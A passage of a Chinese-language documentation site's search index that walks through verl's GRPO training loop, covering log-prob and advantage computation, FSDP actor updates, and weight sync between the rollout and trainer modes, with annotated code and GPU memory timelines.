\u663e\u5b58\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#44-3-old-log-prob-actor-fsdp","title":"4.4 \u9636\u6bb5 3\uff1a\u8ba1\u7b97 Old Log Prob\uff08\u4f7f\u7528 Actor FSDP\uff09","text":"<p>\u4ee3\u7801\u4f4d\u7f6e\uff1a - \u8c03\u7528\u5165\u53e3\uff1a<code>verl/trainer/ppo/ray_trainer.py:1100-1110</code> - Worker \u5b9e\u73b0\uff1a<code>verl/workers/fsdp_workers.py:986-1026</code></p> <pre><code># \u6587\u4ef6: verl/trainer/ppo/ray_trainer.py:1100-1110\n\n# recompute old_log_probs\nwith marked_timer(\"old_log_prob\", timing_raw, color=\"blue\"):\n    old_log_prob = self.actor_rollout_wg.compute_log_prob(batch)\n    entropys = old_log_prob.batch[\"entropys\"]\n    response_masks = batch.batch[\"response_mask\"]\n    loss_agg_mode = self.config.actor_rollout_ref.actor.loss_agg_mode\n    entropy_agg = agg_loss(loss_mat=entropys, loss_mask=response_masks, loss_agg_mode=loss_agg_mode)\n    old_log_prob_metrics = {\"actor/entropy\": entropy_agg.detach().item()}\n    metrics.update(old_log_prob_metrics)\n    old_log_prob.batch.pop(\"entropys\")\n    batch = batch.union(old_log_prob)\n\n\n# \u6587\u4ef6: verl/workers/fsdp_workers.py:986-1026\n\n@register(dispatch_mode=make_nd_compute_dataproto_dispatch_fn(mesh_name=\"actor\"))\n@DistProfiler.annotate(color=\"blue\", role=\"actor_compute_log_prob\")\ndef compute_log_prob(self, data: DataProto):\n    \"\"\"\u8ba1\u7b97\u65e7\u7b56\u7565\u7684 Log Probs\uff08\u7528\u4e8e PPO importance sampling\uff09\"\"\"\n\n    # ========== \u4e0d\u9700\u8981\u6a21\u5f0f\u5207\u6362\uff01==========\n    # \u56e0\u4e3a\u5f53\u524d\u5df2\u7ecf\u5728 Trainer Mode\uff08\u4e0a\u4e00\u6b65 trainer_mode() \u5b8c\u6210\uff09\n\n    # ========== \u6b65\u9aa4 3.1: \u52a0\u8f7d Actor FSDP \u5230 GPU\uff08\u5982\u679c offload \u4e86\uff09==========\n    if self._is_offload_param:\n        load_fsdp_model_to_gpu(self.actor_module_fsdp)\n        # \u2192 \u4ece CPU \u52a0\u8f7d\u53c2\u6570\u5206\u7247\uff082GB\uff09\n\n    # ========== \u6b65\u9aa4 3.2: \u4f7f\u7528 Actor FSDP \u8ba1\u7b97 log prob ==========\n    output, entropys = self.actor.compute_log_prob(\n        data=data,\n        calculate_entropy=True\n    )\n    # \u2192 Forward pass\uff08Teacher Forcing\uff09\n    # \u2192 \u8ba1\u7b97\u6bcf\u4e2a token \u7684 log probability\n    # \u2192 \u4f7f\u7528\u7684\u662f **\u5f53\u524d\u8bad\u7ec3\u4e2d\u7684 Actor \u6a21\u578b**\uff08\u4e0d\u662f Rollout\uff09\n\n    # ========== \u6b65\u9aa4 3.3: Offload Actor FSDP \u56de CPU\uff08\u5982\u679c\u914d\u7f6e\u4e86\uff09==========\n    if self._is_offload_param:\n        offload_fsdp_model_to_cpu(self.actor_module_fsdp)\n        # \u2192 \u91ca\u653e 2GB \u663e\u5b58\n\n    return output\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#45-4-advantagetaskrunner-cpu","title":"4.5 \u9636\u6bb5 4\uff1a\u8ba1\u7b97 Advantage\uff08TaskRunner CPU\uff09","text":"<p>\u4ee3\u7801\u4f4d\u7f6e\uff1a<code>verl/trainer/ppo/ray_trainer.py:1132-1164</code></p> <pre><code># \u6587\u4ef6: verl/trainer/ppo/ray_trainer.py:1132-1164\n\nwith marked_timer(\"adv\", timing_raw, color=\"brown\"):\n    # we combine with rule-based rm\n    reward_extra_infos_dict: dict[str, list]\n    if self.config.reward_model.launch_reward_fn_async:\n        reward_tensor, reward_extra_infos_dict = ray.get(future_reward)\n    batch.batch[\"token_level_scores\"] = reward_tensor\n\n    if reward_extra_infos_dict:\n        batch.non_tensor_batch.update({k: np.array(v) for k, v in reward_extra_infos_dict.items()})\n\n    # compute rewards. apply_kl_penalty if available\n    if self.config.algorithm.use_kl_in_reward:\n        batch, kl_metrics = apply_kl_penalty(\n            batch, kl_ctrl=self.kl_ctrl_in_reward, kl_penalty=self.config.algorithm.kl_penalty\n        )\n        metrics.update(kl_metrics)\n    else:\n        batch.batch[\"token_level_rewards\"] = batch.batch[\"token_level_scores\"]\n\n    # compute advantages, executed on the driver process\n    norm_adv_by_std_in_grpo = self.config.algorithm.get(\n        \"norm_adv_by_std_in_grpo\", True\n    )  # GRPO adv normalization factor\n\n    batch = compute_advantage(\n        batch,\n        adv_estimator=self.config.algorithm.adv_estimator,\n        gamma=self.config.algorithm.gamma,\n        lam=self.config.algorithm.lam,\n        num_repeat=self.config.actor_rollout_ref.rollout.n,\n        norm_adv_by_std_in_grpo=norm_adv_by_std_in_grpo,\n        config=self.config.algorithm,\n    )\n\n# \u5728 TaskRunner\uff08CPU\uff09\u4e2d\u6267\u884c\n# \u4e0d\u9700\u8981\u6a21\u5f0f\u5207\u6362\n# \u4e0d\u5360\u7528 GPU \u663e\u5b58\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#46-5-actor-fsdp","title":"4.6 \u9636\u6bb5 5\uff1a\u66f4\u65b0 Actor \u6a21\u578b\uff08FSDP \u8bad\u7ec3\uff09","text":"<p>\u4ee3\u7801\u4f4d\u7f6e\uff1a - \u8c03\u7528\u5165\u53e3\uff1a<code>verl/trainer/ppo/ray_trainer.py:1174-1180</code> - Worker \u5b9e\u73b0\uff1a<code>verl/workers/fsdp_workers.py:877-923</code></p> <pre><code># \u6587\u4ef6: verl/trainer/ppo/ray_trainer.py:1174-1180\n\n# implement critic warmup\nif self.config.trainer.critic_warmup &lt;= self.global_steps:\n    # update actor\n    with marked_timer(\"update_actor\", timing_raw, color=\"red\"):\n        batch.meta_info[\"multi_turn\"] = self.config.actor_rollout_ref.rollout.multi_turn.enable\n        actor_output = self.actor_rollout_wg.update_actor(batch)\n    actor_output_metrics = reduce_metrics(actor_output.meta_info[\"metrics\"])\n    metrics.update(actor_output_metrics)\n\n\n# \u6587\u4ef6: verl/workers/fsdp_workers.py:877-923\n\n@register(dispatch_mode=make_nd_compute_dataproto_dispatch_fn(mesh_name=\"actor\"))\n@DistProfiler.annotate(color=\"red\", role=\"actor_update\")\ndef update_actor(self, data: DataProto):\n    \"\"\"\u6267\u884c PPO \u7b56\u7565\u66f4\u65b0\"\"\"\n\n    # ========== \u4e0d\u9700\u8981\u6a21\u5f0f\u5207\u6362\uff01==========\n    # \u56e0\u4e3a\u5f53\u524d\u5df2\u7ecf\u5728 Trainer Mode\n\n    # ========== \u6b65\u9aa4 5.1: \u52a0\u8f7d\u6a21\u578b\u548c\u4f18\u5316\u5668\u5230 GPU ==========\n    if self._is_offload_param:\n        load_fsdp_model_to_gpu(self.actor_module_fsdp)\n        # \u2192 \u52a0\u8f7d Actor \u53c2\u6570\u5206\u7247\uff082GB\uff09\n    if self._is_offload_optimizer:\n        load_fsdp_optimizer(optimizer=self.actor_optimizer, device_id=get_device_id())\n        # \u2192 \u52a0\u8f7d\u4f18\u5316\u5668\u72b6\u6001\uff084GB\uff09\n\n    # ========== \u6b65\u9aa4 5.2: \u8c03\u7528 PPO Actor \u8bad\u7ec3 ==========\n    with self.ulysses_sharding_manager:\n        data = data.to(\"cpu\")  # \u5148\u79fb\u5230 CPU\uff0c\u540e\u7eed\u6309 micro-batch \u79fb\u5230 GPU\n        output = self.actor.update_policy(data)\n        # \u2193 \u5185\u90e8\u6267\u884c mini-batch \u8bad\u7ec3\u5faa\u73af\n        # \u2193 Forward, Backward, Optimizer Step\n        # \u2193 FSDP \u81ea\u52a8\u540c\u6b65\u68af\u5ea6\u548c\u53c2\u6570\uff08NCCL All-Reduce\uff09\n\n    # ========== \u6b65\u9aa4 5.3: Offload \u6a21\u578b\u548c\u4f18\u5316\u5668\u56de CPU ==========\n    if self._is_offload_param:\n        offload_fsdp_model_to_cpu(self.actor_module_fsdp)\n        # \u2192 \u91ca\u653e 2GB\n    if self._is_offload_optimizer:\n        offload_fsdp_optimizer(optimizer=self.actor_optimizer)\n        # \u2192 \u91ca\u653e 4GB\n\n    return output\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#5","title":"5. \u6a21\u5f0f\u5207\u6362\u7684\u8be6\u7ec6\u673a\u5236","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#51-rollout_mode-trainer-rollout","title":"5.1 <code>rollout_mode()</code> - \u4ece Trainer \u5207\u6362\u5230 Rollout","text":"<p>\u4ee3\u7801\u4f4d\u7f6e\uff1a<code>verl/workers/fsdp_workers.py:658-739</code></p> <p>\u8c03\u7528\u65f6\u673a\uff1a\u6bcf\u6b21 <code>generate_sequences()</code> \u5f00\u59cb\u65f6</p> <pre><code># \u6587\u4ef6: verl/workers/fsdp_workers.py:658-739\n\nasync def rollout_mode(self):\n    \"\"\"Context switch hybridengine to rollout mode.\"\"\"\n\n    # ========== \u5b50\u6b65\u9aa4 1: \u6e05\u7406\u7f13\u5b58 ==========\n    aggressive_empty_cache(force_sync=True)\n    # \u2192 torch.cuda.empty_cache()\n    # \u2192 \u6e05\u7406\u788e\u7247\u5316\u7684\u663e\u5b58\n\n    # ========== \u5b50\u6b65\u9aa4 2: \u52a0\u8f7d Actor FSDP \u5230 GPU\uff08\u5982\u679c\u4e4b\u524d offload \u4e86\uff09==========\n    log_gpu_memory_usage(\"Before load_fsdp_model_to_gpu\", logger=logger)\n    if self._is_offload_param:\n        load_fsdp_model_to_gpu(self.actor_module_fsdp)\n        # \u2192 \u4ece CPU \u52a0\u8f7d\u53c2\u6570\u5206\u7247\u5230 GPU\n        # \u2192 \u663e\u5b58\u589e\u52a0 2GB\n    log_gpu_memory_usage(\"After load_fsdp_model_to_gpu\", logger=logger)\n\n    # ========== \u5b50\u6b65\u9aa4 3: \u6536\u96c6 FSDP \u53c2\u6570\uff08\u5206\u7247 \u2192 \u5b8c\u6574\uff09==========\n    peft_config = None\n    peft_model = getattr(self.actor_module_fsdp, \"_fsdp_wrapped_module\", self.actor_module_fsdp)\n\n    if hasattr(peft_model, \"peft_config\"):  # LoRA \u6a21\u5f0f\n        # \u4ec5\u6536\u96c6 LoRA \u53c2\u6570\uff08\u8f7b\u91cf\u7ea7\uff09\n        params = collect_lora_params(\n            module=self.actor_module_fsdp,\n            layered_summon=self.config.rollout.get(\"layered_summon\", False),\n            base_sync_done=self.base_sync_done,\n        )\n    else:  # \u5b8c\u6574\u6a21\u578b\n        # \u6536\u96c6\u5b8c\u6574\u53c2\u6570\uff08\u91cd\u91cf\u7ea7\uff09\n        params = self.actor_module_fsdp.state_dict()\n        # \u2192 \u5185\u90e8\u8c03\u7528 FSDP \u7684 state_dict()\n        # \u2192 \u6839\u636e\u914d\u7f6e\u51b3\u5b9a\u662f SHARDED_STATE_DICT \u8fd8\u662f FULL_STATE_DICT\n\n    # ========== \u5b50\u6b65\u9aa4 4: \u8f6c\u6362\u53c2\u6570\u683c\u5f0f ==========\n    params = convert_weight_keys(\n        params,\n        getattr(self.actor_module_fsdp, \"_fsdp_wrapped_module\", self.actor_module_fsdp)\n    )\n    # \u2192 \u8f6c\u6362 FSDP \u7684 key \u683c\u5f0f\u4e3a Rollout \u671f\u671b\u7684\u683c\u5f0f\n    # \u2192 \u4f8b\u5982\uff1a\u79fb\u9664 \"_fsdp_wrapped_module.\" \u524d\u7f00\n\n    # ========== \u5b50\u6b65\u9aa4 5: \u8f6c\u6362\u4e3a full_tensor\uff08\u5173\u952e\uff01\uff09==========\n    # \u5bf9\u4e8e FSDP2 \u4f7f\u7528 DTensor\uff0c\u9700\u8981\u663e\u5f0f\u8f6c\u6362\n    if fsdp_version(self.actor_module_fsdp) == 2:  # FSDP2\n        device = get_device_id()\n        per_tensor_param = (\n            (name, param.to(device, non_blocking=True).full_tensor()\n             if isinstance(param, DTensor) else param)\n            for name, param in params.items()\n        )\n    else:  # FSDP1\n        per_tensor_param = params.items()\n\n    # DTensor.full_tensor() \u7684\u4f5c\u7528\uff1a\n    # 1. \u89e6\u53d1 all-gather \u64cd\u4f5c\uff08NCCL \u901a\u4fe1\uff09\n    # 2. \u5c06 8 \u4e2a GPU \u7684\u5206\u7247\u805a\u5408\u5230\u6bcf\u4e2a GPU\n    # 3. \u8fd4\u56de\u5b8c\u6574\u7684 tensor\uff0816GB\uff09\n    #\n    # \u901a\u4fe1\u91cf\uff1a\n    # - GPU 0 \u53d1\u9001 2GB\uff0c\u63a5\u6536 14GB \u2192 \u603b\u8ba1 16GB\n    # - GPU 1 \u53d1\u9001 2GB\uff0c\u63a5\u6536 14GB \u2192 \u603b\u8ba1 16GB\n    # - ...\n    # - \u603b\u901a\u4fe1\u91cf\uff1a8 * 14GB = 112GB\n    # - \u901a\u4fe1\u65f6\u95f4\uff1a~200ms\uff08NVLink \u5e26\u5bbd 600GB/s\uff09\n\n    # ========== \u5b50\u6b65\u9aa4 6: \u6062\u590d Rollout Engine\uff08\u91cd\u65b0\u52a0\u8f7d KV Cache\uff09==========\n    if self.config.rollout.free_cache_engine:\n        await self.rollout.resume(tags=[\"weights\"])\n        # \u2192 \u91cd\u65b0\u5206\u914d KV Cache \u7a7a\u95f4\uff0832GB\uff09\n        # \u2192 \u663e\u5b58\u589e\u52a0 32GB\n    log_gpu_memory_usage(\"After resume weights\", logger=logger)\n\n    # ========== \u5b50\u6b65\u9aa4 7: \u66f4\u65b0 Rollout \u53c2\u6570\uff08\u6838\u5fc3\uff01\uff09==========\n    # \u6587\u4ef6: verl/workers/fsdp_workers.py:725-728\n    await self.rollout.update_weights(per_tensor_param, peft_config=peft_config)\n    # \u2192 \u5c06 Actor FSDP \u7684\u53c2\u6570\u590d\u5236\u5230 Rollout \u6a21\u578b\n    # \u2192 in-place \u66f4\u65b0\uff0c\u4e0d\u9700\u8981\u989d\u5916\u663e\u5b58\n    # \u2192 \u8017\u65f6\uff1a~100ms\uff08\u590d\u5236 16GB \u6570\u636e\uff09\n\n    log_gpu_memory_usage(\"After update_weights\", logger=logger)\n    del params, per_tensor_param\n    aggressive_empty_cache(force_sync=True)\n\n    # ========== \u5b50\u6b65\u9aa4 8: \u6062\u590d KV Cache ==========\n    if self.config.rollout.free_cache_engine:\n        await self.rollout.resume(tags=[\"kv_cache\"])\n        # \u2192 \u91cd\u65b0\u5206\u914d KV Cache\uff0832GB\uff09\n    log_gpu_memory_usage(\"After resume kv_cache\", logger=logger)\n\n    # ========== \u5b50\u6b65\u9aa4 9: \u4fdd\u5b58/\u6062\u590d\u968f\u673a\u72b6\u6001 ==========\n    self.base_sync_done = True\n    # \u4fdd\u5b58 Trainer \u7684\u968f\u673a\u72b6\u6001\n    self.torch_random_states = get_torch_device().get_rng_state()\n    # \u6062\u590d Rollout \u7684\u968f\u673a\u72b6\u6001\n    get_torch_device().set_rng_state(self.gen_random_states)\n    # \u2192 \u786e\u4fdd\u751f\u6210\u7684\u968f\u673a\u6027\u53ef\u590d\u73b0\n</code></pre> <p>\u663e\u5b58\u53d8\u5316\u65f6\u95f4\u7ebf\uff1a</p> <pre><code>\u521d\u59cb\u72b6\u6001\uff08Trainer Mode\uff09:\n\u251c\u2500\u2500 Actor FSDP \u5206\u7247: 2GB (GPU)\n\u251c\u2500\u2500 Actor \u4f18\u5316\u5668: 4GB (GPU \u6216 CPU offload)\n\u251c\u2500\u2500 Rollout \u53c2\u6570: 16GB (GPU)\n\u2514\u2500\u2500 \u603b\u8ba1: 18-22GB\n\n\u6267\u884c rollout_mode():\n\u251c\u2500\u2500 load_fsdp_model_to_gpu: +2GB (\u5982\u679c\u4e4b\u524d offload)\n\u251c\u2500\u2500 params.full_tensor(): +16GB (\u4e34\u65f6\uff0call-gather)\n\u251c\u2500\u2500 update_weights: 0GB (in-place \u66ff\u6362)\n\u251c\u2500\u2500 \u91ca\u653e\u4e34\u65f6\u53c2\u6570: -16GB\n\u251c\u2500\u2500 resume KV Cache: +32GB\n\u2514\u2500\u2500 \u603b\u8ba1: 50GB\n\n\u6700\u7ec8\u72b6\u6001\uff08Rollout Mode\uff09:\n\u251c\u2500\u2500 Actor FSDP \u5206\u7247: 2GB (GPU \u6216 CPU offload)\n\u251c\u2500\u2500 Rollout \u53c2\u6570: 16GB (GPU, \u5df2\u66f4\u65b0)\n\u251c\u2500\u2500 Rollout KV Cache: 32GB (GPU)\n\u2514\u2500\u2500 \u603b\u8ba1: 50GB (\u5982\u679c Actor offload \u5219 48GB)\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#52-trainer_mode-rollout-trainer","title":"5.2 <code>trainer_mode()</code> - \u4ece Rollout \u5207\u6362\u56de Trainer","text":"<p>\u4ee3\u7801\u4f4d\u7f6e\uff1a<code>verl/workers/fsdp_workers.py:741-757</code></p> <p>\u8c03\u7528\u65f6\u673a\uff1a\u6bcf\u6b21 <code>generate_sequences()</code> \u7ed3\u675f\u65f6</p> <pre><code># \u6587\u4ef6: verl/workers/fsdp_workers.py:741-757\n\nasync def trainer_mode(self):\n    \"\"\"Context switch hybridengine to trainer mode.\"\"\"\n\n    # ========== \u5b50\u6b65\u9aa4 1: \u91ca\u653e Rollout KV Cache\uff08\u5173\u952e\uff01\uff09==========\n    if self.config.rollout.free_cache_engine:\n        log_gpu_memory_usage(\"Before rollout offload\", logger=logger)\n        await self.rollout.release()\n        # \u2192 \u91ca\u653e KV Cache\uff0832GB\uff09\n        # \u2192 \u4fdd\u7559 Rollout \u53c2\u6570\uff0816GB\uff09\n        log_gpu_memory_usage(\"After rollout offload\", logger=logger)\n\n    # rollout.release() \u5185\u90e8\u903b\u8f91\uff1a\n    # async def release(self):\n    #     \"\"\"\u91ca\u653e KV Cache \u548c\u5176\u4ed6\u7f13\u5b58\"\"\"\n    #     # 1. \u91ca\u653e\u6240\u6709 KV Cache \u5757\n    #     self.kv_cache_manager.clear()  # \u2192 \u91ca\u653e 32GB\n    #\n    #     # 2. \u6e05\u7406\u5176\u4ed6\u7f13\u5b58\uff08\u5982 PageTable\uff09\n    #     self.cache_engine.clear()\n    #\n    #     # 3. \u4fdd\u7559\u6a21\u578b\u53c2\u6570\uff08\u4e0d\u91ca\u653e\uff09\n    #     # self.model.parameters() \u4ecd\u7136\u5728 GPU\uff0816GB\uff09\n    #\n    #     torch.cuda.empty_cache()\n\n    # ========== \u5b50\u6b65\u9aa4 2: \u5207\u6362 Actor \u6a21\u578b\u4e3a\u8bad\u7ec3\u6a21\u5f0f ==========\n    self.actor_module_fsdp.train()\n    # \u2192 \u542f\u7528 Dropout\u3001BatchNorm \u7b49\u8bad\u7ec3\u7279\u6027\n\n    # ========== \u5b50\u6b65\u9aa4 3: \u6e05\u7406\u7f13\u5b58 ==========\n    aggressive_empty_cache(force_sync=True)\n    # \u2192 torch.cuda.empty_cache()\n    # \u2192 \u6574\u7406\u788e\u7247\u5316\u7684\u663e\u5b58\n\n    # ========== \u5b50\u6b65\u9aa4 4: \u8bbe\u7f6e\u53ef\u6269\u5c55\u6bb5\uff08PyTorch \u663e\u5b58\u7ba1\u7406\u4f18\u5316\uff09==========\n    set_expandable_segments(True)\n    # \u2192 \u5141\u8bb8 PyTorch \u52a8\u6001\u6269\u5c55\u663e\u5b58\u6bb5\n    # \u2192 \u51cf\u5c11\u663e\u5b58\u788e\u7247\u5316\n\n    # ========== \u5b50\u6b65\u9aa4 5: \u6062\u590d\u968f\u673a\u72b6\u6001 ==========\n    # \u4fdd\u5b58 Rollout \u7684\u968f\u673a\u72b6\u6001\n    self.gen_random_states = get_torch_device().get_rng_state()\n    # \u6062\u590d Trainer \u7684\u968f\u673a\u72b6\u6001\n    get_torch_device().set_rng_state(self.torch_random_states)\n    # \u2192 \u786e\u4fdd\u8bad\u7ec3\u7684\u968f\u673a\u6027\u53ef\u590d\u73b0\n</code></pre> <p>\u663e\u5b58\u53d8\u5316\u65f6\u95f4\u7ebf\uff1a</p> <pre><code>\u521d\u59cb\u72b6\u6001\uff08Rollout Mode\uff09:\n\u251c\u2500\u2500 Actor FSDP \u5206\u7247: 2GB (\u53ef\u80fd\u5728 CPU)\n\u251c\u2500\u2500 Rollout \u53c2\u6570: 16GB (GPU)\n\u251c\u2500\u2500 Rollout KV Cache: 32GB (GPU)\n\u2514\u2500\u2500 \u603b\u8ba1: 50GB\n\n\u6267\u884c trainer_mode():\n\u251c\u2500\u2500 rollout.release(): -32GB (\u91ca\u653e KV Cache)\n\u251c\u2500\u2500 empty_cache(): 0GB (\u6574\u7406\u788e\u7247)\n\u2514\u2500\u2500 \u603b\u8ba1: 18GB\n\n\u6700\u7ec8\u72b6\u6001\uff08Trainer Mode\uff09:\n\u251c\u2500\u2500 Actor FSDP \u5206\u7247: 2GB (GPU)\n\u251c\u2500\u2500 Actor \u4f18\u5316\u5668: 4GB (GPU \u6216 CPU offload)\n\u251c\u2500\u2500 Rollout \u53c2\u6570: 16GB (GPU, \u4fdd\u7559\u4f46\u4e0d\u4f7f\u7528)\n\u2514\u2500\u2500 \u603b\u8ba1: 18-22GB\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#6","title":"6. \u53c2\u6570\u540c\u6b65\u7684\u5e95\u5c42\u5b9e\u73b0","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#61-rollout","title":"6.1 \u4e3a\u4ec0\u4e48\u6bcf\u6b21 Rollout \u90fd\u9700\u8981\u540c\u6b65\u53c2\u6570\uff1f","text":"<p>\u56e0\u4e3a Actor \u6a21\u578b\u5728\u6bcf\u6b21\u8bad\u7ec3\u540e\u90fd\u4f1a\u66f4\u65b0\uff01</p> <pre><code># ========== \u65f6\u95f4\u7ebf ==========\n\u65f6\u523b t0: \u521d\u59cb\u5316\n  Actor FSDP \u53c2\u6570 = W0\n  Rollout \u53c2\u6570 = W0\n  \uff08\u4e24\u8005\u4e00\u81f4\uff09\n\n\u65f6\u523b t1: \u7b2c\u4e00\u6b21\u8bad\u7ec3\n  generate_sequences():\n    rollout_mode() \u2192 Actor (W0) \u2192 Rollout (W0)  # \u540c\u6b65\uff08\u5b9e\u9645\u4e0a\u53c2\u6570\u5df2\u4e00\u81f4\uff0c\u4f46\u4ecd\u6267\u884c\uff09\n    Rollout \u63a8\u7406\uff08\u4f7f\u7528 W0\uff09\n  update_actor():\n    \u8bad\u7ec3\u66f4\u65b0 \u2192 Actor (W1)  # \u53c2\u6570\u5df2\u6539\u53d8\uff01\n\n\u65f6\u523b t2: \u7b2c\u4e8c\u6b21\u8bad\u7ec3\n  generate_sequences():\n    rollout_mode() \u2192 Actor (W1) \u2192 Rollout (W1)  # \u540c\u6b65\uff08\u5fc5\u987b\uff01Rollout \u8fd8\u662f W0\uff09\n    Rollout \u63a8\u7406\uff08\u4f7f\u7528 W1\uff09  # \u4f7f\u7528\u6700\u65b0\u7684\u7b56\u7565\n  update_actor():\n    \u8bad\u7ec3\u66f4\u65b0 \u2192 Actor (W2)\n\n\u65f6\u523b t3: \u7b2c\u4e09\u6b21\u8bad\u7ec3\n  generate_sequences():\n    rollout_mode() \u2192 Actor (W2) \u2192 Rollout (W2)  # \u540c\u6b65\n    Rollout \u63a8\u7406\uff08\u4f7f\u7528 W2\uff09\n  ...\n</code></pre> <p>\u5982\u679c\u4e0d\u540c\u6b65\u4f1a\u600e\u6837\uff1f</p> <pre><code># \u9519\u8bef\u793a\u4f8b\uff1a\u4e0d\u540c\u6b65\n\u65f6\u523b t1: Actor = W0, Rollout = W0 \u2192 \u751f\u6210\u4f7f\u7528 W0 \u2713\n\u65f6\u523b t2: Actor = W1, Rollout = W0 \u2192 \u751f\u6210\u4f7f\u7528 W0 \u2717 (\u5e94\u8be5\u7528 W1!)\n\u65f6\u523b t3: Actor = W2, Rollout = W0 \u2192 \u751f\u6210\u4f7f\u7528 W0 \u2717 (\u5e94\u8be5\u7528 W2!)\n\n\u7ed3\u679c\uff1a\n- Rollout \u4f7f\u7528\u7684\u662f\u521d\u59cb\u7b56\u7565\uff0c\u4e0d\u662f\u5f53\u524d\u7b56\u7565\n- PPO \u7684 importance sampling \u5931\u6548\n- \u8bad\u7ec3\u53d1\u6563\uff01\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#62-fsdp-state_dict","title":"6.2 FSDP state_dict() \u7684\u673a\u5236","text":"<p>\u4ee3\u7801\u4f4d\u7f6e\uff1a - \u914d\u7f6e state_dict \u7c7b\u578b\uff1a<code>verl/workers/fsdp_workers.py:634-644</code> - \u8c03\u7528 state_dict()\uff1a<code>verl/workers/fsdp_workers.py:679</code></p> <pre><code># ========== \u6b65\u9aa4 1: \u914d\u7f6e state_dict \u7c7b\u578b ==========\n# \u6587\u4ef6: verl/workers/fsdp_workers.py:634-644\n\nif torch.distributed.get_world_size() == 1 and fsdp_version(self.actor_module_fsdp) == 1:\n    FSDP.set_state_dict_type(\n        self.actor_module_fsdp,\n        state_dict_type=StateDictType.FULL_STATE_DICT,\n        state_dict_config=FullStateDictConfig(),\n    )\nelif fsdp_version(self.actor_module_fsdp) == 1:\n    FSDP.set_state_dict_type(\n        self.actor_module_fsdp,\n        state_dict_type=StateDictType.SHARDED_STATE_DICT,  # \u2190 \u591a GPU \u4f7f\u7528\u5206\u7247\u6a21\u5f0f\n        state_dict_config=ShardedStateDictConfig(),\n    )\n\n\n# ========== \u6b65\u9aa4 2: \u8c03\u7528 state_dict() ==========\n# \u6587\u4ef6: verl/workers/fsdp_workers.py:679\n\nparams = self.actor_module_fsdp.state_dict()\n\n# FSDP state_dict() \u7684\u5185\u90e8\u884c\u4e3a\uff08\u6839\u636e\u914d\u7f6e\uff09\uff1a\n\n# 1. \u5982\u679c\u914d\u7f6e\u4e3a SHARDED_STATE_DICT\uff1a\n#    - \u6bcf\u4e2a GPU \u53ea\u8fd4\u56de\u672c\u5730\u5206\u7247\uff082GB\uff09\n#    - \u4e0d\u9700\u8981 all-gather\n#    - \u663e\u5b58\u5f00\u9500\uff1a0GB\uff08\u4ec5\u8fd4\u56de\u5df2\u6709\u5206\u7247\u7684\u5f15\u7528\uff09\n#    - \u8fd4\u56de\u7684 params \u662f\u5206\u7247\u7684\uff08DTensor\uff09\n\n# 2. \u5982\u679c\u914d\u7f6e\u4e3a FULL_STATE_DICT\uff1a\n#    - \u5185\u90e8\u8c03\u7528 FSDP.summon_full_params()\n#    - All-Gather \u805a\u5408\u6240\u6709\u5206\u7247\u5230\u6bcf\u4e2a GPU\n#    - \u4e34\u65f6\u663e\u5b58\u5f00\u9500\uff1a16GB\uff08\u5b8c\u6574\u53c2\u6570\uff09\n#    - \u8fd4\u56de\u540e\u7acb\u5373\u91ca\u653e\u4e34\u65f6\u53c2\u6570\n\n\n# ========== verl \u4f7f\u7528 SHARDED_STATE_DICT \u7684\u539f\u56e0 ==========\n# 1. \u8282\u7701\u663e\u5b58\uff1a\u4e0d\u5728 state_dict() \u9636\u6bb5\u89e6\u53d1 all-gather\n# 2. \u5ef6\u8fdf\u805a\u5408\uff1a\u5728\u540e\u7eed\u7684 full_tensor() \u8c03\u7528\u65f6\u624d\u89e6\u53d1 all-gather\n# 3. \u7075\u6d3b\u6027\uff1a\u53ef\u4ee5\u9009\u62e9\u6027\u5730\u805a\u5408\u67d0\u4e9b\u5c42\uff08layered_summon\uff09\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#63-dtensorfull_tensor-all-gather","title":"6.3 DTensor.full_tensor() - All-Gather \u7684\u89e6\u53d1\u70b9","text":"<p>\u4ee3\u7801\u4f4d\u7f6e\uff1a<code>verl/workers/fsdp_workers.py:708-714</code></p> <pre><code># \u6587\u4ef6: verl/workers/fsdp_workers.py:708-714\n\nif fsdp_version(self.actor_module_fsdp) == 2:  # FSDP2\n    device = get_device_id()\n    per_tensor_param = (\n        (name, param.to(device, non_blocking=True).full_tensor()\n         if isinstance(param, DTensor) else param)  # \u2190 \u8fd9\u91cc\u89e6\u53d1 all-gather\n        for name, param in params.items()\n    )\nelse:  # FSDP1\n    per_tensor_param = params.items()\n\n\n# ========== DTensor.full_tensor() \u7684\u4f5c\u7528 ==========\n# DTensor \u662f\u5206\u7247\u7684 tensor\uff0c\u6bcf\u4e2a GPU \u53ea\u6709\u4e00\u90e8\u5206\n\n# \u4f8b\u5982\uff1a\u4e00\u4e2a [8192, 8192] \u7684\u6743\u91cd\u77e9\u9635\n# - GPU 0: DTensor\uff0c\u672c\u5730\u5206\u7247 [1024, 8192] (2GB / 8)\n# - GPU 1: DTensor\uff0c\u672c\u5730\u5206\u7247 [1024, 8192]\n# - ...\n# - GPU 7: 